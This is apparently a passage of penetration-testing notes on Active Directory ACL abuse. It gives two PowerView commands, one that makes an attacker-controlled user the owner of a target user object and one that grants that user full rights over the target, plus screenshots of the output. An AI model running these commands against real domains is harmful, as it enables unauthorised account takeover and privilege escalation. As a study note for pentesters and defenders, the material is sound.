#### Setting the Object Owner with `PowerView`
```powershell
Set-DomainObjectOwner -Identity <TARGET-USER> -OwnerIdentity <USER> -Verbose
```
<img width="1794" height="147" alt="Pasted image 20251230154716" src="https://github.com/user-attachments/assets/6477d0e5-5c0c-46d7-ad27-22c4b9efc6d5" />
#### Modifying TARGET-USER's DACL
```powershell
Add-DomainObjectAcl -TargetIdentity <TARGET-USER> -PrincipalIdentity <USER> -Rights All -Verbose
```
<img width="1819" height="193" alt="Pasted image 20251230154819" src="https://github.com/user-attachments/assets/379e62f4-6af4-4c2f-9e4c-92cd7297f7cf" />
Now we have all rights on the user

